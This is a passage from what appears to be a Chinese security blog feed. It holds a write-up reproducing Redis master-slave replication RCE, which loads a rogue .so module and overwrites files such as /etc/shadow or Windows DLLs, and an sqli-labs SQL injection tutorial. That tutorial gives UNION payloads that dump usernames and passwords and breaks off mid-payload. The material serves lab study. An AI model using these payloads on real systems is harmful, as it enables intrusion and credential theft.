&lt;p&gt;edis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。&lt;/p&gt;
&lt;p&gt;使用两台虚拟机来模拟主从复制。&lt;/p&gt;
&lt;p&gt;在目标机器上设置slave状态&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1050; 
			flex-basis: 2520px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/redis/image-20210730095215245.png&#34; data-size=&#34;420x40&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/redis/image-20210730095215245.png&#34;
			width=&#34;420&#34;
			height=&#34;40&#34;
			srcset=&#34;https://coollllllll.github.io/p/redis/image-20210730095215245_hu070fd516717a35a17570414cbce412c7_7367_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/redis/image-20210730095215245_hu070fd516717a35a17570414cbce412c7_7367_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在master上设置键 xxx&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 748; 
			flex-basis: 1797px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/redis/image-20210730095122095.png&#34; data-size=&#34;322x43&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/redis/image-20210730095122095.png&#34;
			width=&#34;322&#34;
			height=&#34;43&#34;
			srcset=&#34;https://coollllllll.github.io/p/redis/image-20210730095122095_hu571c699dcdbe49b471e169725e172c3b_5597_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/redis/image-20210730095122095_hu571c699dcdbe49b471e169725e172c3b_5597_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在slave上查看键 xxx&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 316; 
			flex-basis: 760px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/redis/image-20210730095425753.png&#34; data-size=&#34;266x84&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/redis/image-20210730095425753.png&#34;
			width=&#34;266&#34;
			height=&#34;84&#34;
			srcset=&#34;https://coollllllll.github.io/p/redis/image-20210730095425753_hu9f45b1b8710c5825e625035a3b044232_9812_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/redis/image-20210730095425753_hu9f45b1b8710c5825e625035a3b044232_9812_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;redis模块&#34;&gt;Redis模块&lt;/h4&gt;
&lt;p&gt;在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。&lt;/p&gt;
&lt;p&gt;编译.so模块, 代码: &lt;a class=&#34;link&#34; href=&#34;https://github.com/n0b0dyCN/RedisModules-ExecuteCommand&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/n0b0dyCN/RedisModules-ExecuteCommand&lt;/a&gt;.&lt;/p&gt;
&lt;h4 id=&#34;利用原理&#34;&gt;利用原理&lt;/h4&gt;
&lt;p&gt;详细原理：https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf&lt;/p&gt;
&lt;p&gt;在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上，然后在从机上加载恶意.so文件，我们就可以执行拓展的新命令了。&lt;/p&gt;
&lt;h4 id=&#34;复现主动连接模式&#34;&gt;复现——主动连接模式&lt;/h4&gt;
&lt;p&gt;使用脚本模拟一个服务端来作为master(包含fullresync请求)&lt;/p&gt;
&lt;p&gt;本次目标靶机为ubuntu，作为slave&lt;/p&gt;
&lt;p&gt;直接执行poc脚本如下:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 203; 
			flex-basis: 488px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/redis/image-20210730101548100.png&#34; data-size=&#34;1263x620&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/redis/image-20210730101548100.png&#34;
			width=&#34;1263&#34;
			height=&#34;620&#34;
			srcset=&#34;https://coollllllll.github.io/p/redis/image-20210730101548100_hu8fa80427c27b07cd9b9b029a6c4d7013_216713_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/redis/image-20210730101548100_hu8fa80427c27b07cd9b9b029a6c4d7013_216713_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;复现被动连接模式&#34;&gt;复现——被动连接模式&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;通过 SSRF 攻击Redis&lt;/p&gt;
&lt;p&gt;内网 Redis 未授权访问/已知 Redis 口令, Redis 需要反向连接 redis rogue server&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;模拟一个服务端master，等待连接&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 328; 
			flex-basis: 787px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/redis/image-20210730144513791.png&#34; data-size=&#34;420x128&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/redis/image-20210730144513791.png&#34;
			width=&#34;420&#34;
			height=&#34;128&#34;
			srcset=&#34;https://coollllllll.github.io/p/redis/image-20210730144513791_hu77a885d43ba5b9a8174817aebed28a49_18766_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/redis/image-20210730144513791_hu77a885d43ba5b9a8174817aebed28a49_18766_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;redis未授权进入目标机器，slaveof到该master&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1024; 
			flex-basis: 2458px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/redis/image-20210730144632522.png&#34; data-size=&#34;420x41&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/redis/image-20210730144632522.png&#34;
			width=&#34;420&#34;
			height=&#34;41&#34;
			srcset=&#34;https://coollllllll.github.io/p/redis/image-20210730144632522_huc7cf3e959501a46b1915cca09533af6b_6310_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/redis/image-20210730144632522_huc7cf3e959501a46b1915cca09533af6b_6310_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;master端等到连接后，成功同步恶意payload至slave&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 575; 
			flex-basis: 1380px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/redis/image-20210730144740877.png&#34; data-size=&#34;1260x219&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/redis/image-20210730144740877.png&#34;
			width=&#34;1260&#34;
			height=&#34;219&#34;
			srcset=&#34;https://coollllllll.github.io/p/redis/image-20210730144740877_hu34d7b9e8833b08703c7e61d91f62e5ab_45114_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/redis/image-20210730144740877_hu34d7b9e8833b08703c7e61d91f62e5ab_45114_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;成功在目标机器加载模块并执行命令&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 224; 
			flex-basis: 539px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/redis/image-20210730144902534.png&#34; data-size=&#34;420x187&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/redis/image-20210730144902534.png&#34;
			width=&#34;420&#34;
			height=&#34;187&#34;
			srcset=&#34;https://coollllllll.github.io/p/redis/image-20210730144902534_hu51ed75f60e59bf403d29445a9513e6b1_22778_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/redis/image-20210730144902534_hu51ed75f60e59bf403d29445a9513e6b1_22778_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;主从复制写纯净文件&#34;&gt;主从复制写纯净文件&lt;/h3&gt;
&lt;p&gt;在 linux 下，可以利用 SYNC 主从同步，来直接写入无杂质的文件，脚本及用法如下：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/r35tart/RedisWriteFile&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/r35tart/RedisWriteFile&lt;/a&gt; (借助原本的redis主从复制rce脚本更改)&lt;/p&gt;
&lt;p&gt;此脚本是通过 Redis 主从写出无损文件，可用于 Windows 平台下写出无损的 EXE、DLL、 LNK 和 Linux 下的 SO 等二进制文件&lt;/p&gt;
&lt;p&gt;也可以用无杂质覆写 Linux 中的 /etc/shadow&lt;/p&gt;
&lt;h4 id=&#34;简单复现&#34;&gt;简单复现&lt;/h4&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 251; 
			flex-basis: 603px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/redis/image-20210730163624626.png&#34; data-size=&#34;1253x498&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/redis/image-20210730163624626.png&#34;
			width=&#34;1253&#34;
			height=&#34;498&#34;
			srcset=&#34;https://coollllllll.github.io/p/redis/image-20210730163624626_hu67f86e1d910ebf0746c8464568858265_80788_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/redis/image-20210730163624626_hu67f86e1d910ebf0746c8464568858265_80788_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;成功写入纯净文件&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 733; 
			flex-basis: 1760px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/redis/image-20210730163854415.png&#34; data-size=&#34;550x75&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/redis/image-20210730163854415.png&#34;
			width=&#34;550&#34;
			height=&#34;75&#34;
			srcset=&#34;https://coollllllll.github.io/p/redis/image-20210730163854415_hu4d68ba72da8b6bd141dca66da96addb5_13557_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/redis/image-20210730163854415_hu4d68ba72da8b6bd141dca66da96addb5_13557_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;redis在windows下的利用方式&#34;&gt;Redis在Windows下的利用方式&lt;/h2&gt;
&lt;p&gt;主要是利用主从写纯净文件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;系统 &lt;code&gt;DLL&lt;/code&gt; 劫持 （目标重启或注销）&lt;/li&gt;
&lt;li&gt;针对特定软件的 &lt;code&gt;DLL&lt;/code&gt; 劫持（目标一次点击）&lt;/li&gt;
&lt;li&gt;覆写目标的快捷方式 （目标一次点击）&lt;/li&gt;
&lt;li&gt;覆写特定软件的配置文件达到提权目的 （目标无需点击或一次点击）&lt;/li&gt;
&lt;li&gt;覆写 &lt;code&gt;sethc.exe&lt;/code&gt; 等文件 （攻击方一次触发）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;参考：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://r3start.net/index.php/2020/05/25/717&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://r3start.net/index.php/2020/05/25/717&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>SQL 注入相关</title>
        <link>https://coollllllll.github.io/p/sql/</link>
        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/sql/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/sql/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post SQL 注入相关" /&gt;&lt;h1 id=&#34;sql注入相关配合sqli-labs&#34;&gt;SQL注入相关(配合sqli-labs)&lt;/h1&gt;
&lt;p&gt;基础总结+sqli-lab，lab过程偏向白盒，省略黑盒探测过程&lt;/p&gt;
&lt;h2 id=&#34;数据库相关&#34;&gt;数据库相关&lt;/h2&gt;
&lt;h3 id=&#34;分类&#34;&gt;分类&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;关系型数据库&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;表格存储，表和表间关系构成数据库，例如MySQL、SQLServer。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;非关系型数据库&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;有Key-Value存储数据库、列存储数据库、文档型数据库、图形存储数据库。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;p&gt;键值数据库：Redis、Memcached&lt;/p&gt;
&lt;p&gt;文档数据库：MongoDB&lt;/p&gt;
&lt;p&gt;图形数据库：Neo4j&lt;/p&gt;
&lt;h3 id=&#34;基础操作&#34;&gt;基础操作&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 查看数据库
show databases;

# 使用数据库
use mysql;

# 查看当前数据库
select database();

# 查看数据表
show tables;

# 查看数据库版本
select version();

# 查看当前数据库用户
select user();

# 查看数据库路径
select @@datadir;

# 查看安装路径
select @@basedir;

# 查看系统类型
select @@version_compile_os;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;mysql元数据-information_schema&#34;&gt;MySQL元数据-information_schema&lt;/h3&gt;
&lt;p&gt;该数据库存储MySQL 服务器所维护的所有其他数据库的信息，如数据库名，数据库的表，表的数据类型与访问权限等。&lt;/p&gt;
&lt;p&gt;该库中有以下三个表：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;SCHEMATA&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;提供当前 MySQL 实例中所有数据库的信息。&lt;code&gt;show databases; &lt;/code&gt;的结果就是取之此表。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;TABLES&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;提供数据库中所有表的信息(包括视图)。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;COLUMNS&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;提供表中所有列信息。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询数据表：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select table_name from information_schema.tables where table_schema=&#39;test&#39;;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;查询数据列：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select column_name from information_schema.columns where table_name=&#39;table1&#39;;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;sql注入相关判断&#34;&gt;SQL注入相关判断&lt;/h2&gt;
&lt;h3 id=&#34;种类&#34;&gt;种类&lt;/h3&gt;
&lt;p&gt;布尔型注入&lt;/p&gt;
&lt;p&gt;联合查询注入&lt;/p&gt;
&lt;p&gt;报错型注入&lt;/p&gt;
&lt;p&gt;时间型注入&lt;/p&gt;
&lt;p&gt;堆叠注入&lt;/p&gt;
&lt;h3 id=&#34;判断注入类型&#34;&gt;判断注入类型&lt;/h3&gt;
&lt;p&gt;在进行手工注入前需要判断当前位置是字符型还是数字型。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;数字型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一般可通过&lt;code&gt;and 1=1&lt;/code&gt;和&lt;code&gt;and 1=2&lt;/code&gt;判断。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用运算符判断：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过加、减、乘、除等运算，判断输入参数附近有没有引号包裹。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;字符型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一般可通过&lt;code&gt;and &#39;1&#39;=&#39;1&lt;/code&gt;和&lt;code&gt;and &#39;1&#39;=&#39;2&lt;/code&gt;判断。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用类型转换特性判断：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在MySQL中当数字与字符进行比较时，字符会被转为数字进行比较。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 309; 
			flex-basis: 743px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/sql/image-20220217101211710.png&#34; data-size=&#34;353x114&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/sql/image-20220217101211710.png&#34;
			width=&#34;353&#34;
			height=&#34;114&#34;
			srcset=&#34;https://coollllllll.github.io/p/sql/image-20220217101211710_hu052e808f6f4e14553bc6e925f7926413_7695_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/sql/image-20220217101211710_hu052e808f6f4e14553bc6e925f7926413_7695_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;字符串1和数字1相等；字符串1a和数字1相等；字符串b和数字0相等。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;综上&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可根据上述方法做一个基本的判断，例如&lt;code&gt;?id=2-1&lt;/code&gt;，返回为空，表明不是数字型可能是字符型；访问&lt;code&gt;?id=1a&lt;/code&gt;，成功回显，表明是字符型。&lt;/p&gt;
&lt;h3 id=&#34;判断数据库&#34;&gt;判断数据库&lt;/h3&gt;
&lt;h4 id=&#34;基于报错判断&#34;&gt;基于报错判断&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;MySQL&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;you have an error in your SQL syntax,check the manual that corrsponds to your mysql server version for the tifht syntax to use near&amp;hellip;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Access&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Microsoft JET Database…&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;MSSQL&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Microsoft ODBC Database…&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;基于数据库标志&#34;&gt;基于数据库标志&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;MSSQL&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select @@version;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;Oracle&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select banner from v$version;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;MySQL&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select @@version,version(),length(user)&amp;gt;0;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;PostgreSQL&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select version();
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;基于数据库名&#34;&gt;基于数据库名&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;MySQL:information_schema&lt;/li&gt;
&lt;li&gt;Access:mysysobjects&lt;/li&gt;
&lt;li&gt;Oracle:sys.user_tables&lt;/li&gt;
&lt;li&gt;MSSQL:sysobjects&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;基于数据库特有函数&#34;&gt;基于数据库特有函数&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;MSSQL:@@pack_received、@@rowcount&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;MySQL:connection_id()、last_insert_id()、row_count()&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Oracle:bitand(1,1)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PostgreSQL: select extract(doy from now())&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;MSSQL和MySQL中都可用substring，而Oracle中只能调用substr&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;hellip;&lt;/p&gt;
&lt;h4 id=&#34;基于字符串处理方式&#34;&gt;基于字符串处理方式&lt;/h4&gt;
&lt;p&gt;MSSQL：&lt;code&gt;&#39;a&#39;+&#39;b&#39;=&#39;ab&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;MySQL：&lt;code&gt;&#39;a&#39;+&#39;b&#39;=&#39;ab&#39;、&#39;ab&#39;=concat(&#39;a&#39;,&#39;b&#39;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Oracle：&lt;code&gt;&#39;a&#39;+&#39;b&#39;=&#39;a&#39;||&#39;b&#39;、&#39;ab&#39;=concat(&#39;a&#39;,&#39;b&#39;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;PostgreSQL：&lt;code&gt;&#39;ab&#39;=concat(&#39;a&#39;,&#39;b&#39;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&amp;hellip;&lt;/p&gt;
&lt;h4 id=&#34;基于特殊符号及注释&#34;&gt;基于特殊符号及注释&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Access:&lt;code&gt;null、%00&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;MySQL:&lt;code&gt;#、--、/**/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Oracle:&lt;code&gt;-- 、/**/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;MSSQL：&lt;code&gt;-- 、/**/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Oracle中不支持多行查询，当存在&lt;code&gt;;&lt;/code&gt;子句查询符会报错&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;union注入&#34;&gt;UNION注入&lt;/h2&gt;
&lt;h3 id=&#34;原理&#34;&gt;原理&lt;/h3&gt;
&lt;p&gt;union用于将两个或多个select查询语句结果集合并&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意点：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;使用union，select语句必须是相同数量的列&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;常见用法&#34;&gt;常见用法&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;+UNION+SELECT+1,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users),3--+
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;// 库名
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;union select 1,group_concat(schema_name),3 from information_schema.schemata
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;union select 1,(select schema_name from information_schema.schemata limit 0,1),3
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;// 表名
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;// 列名
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and table_name=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;emails&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;// 数据
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;union select 1,group_concat(id,email_id),3 from security.emails
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;// ???待。。。
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;?id=-1&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x00&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;IN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span 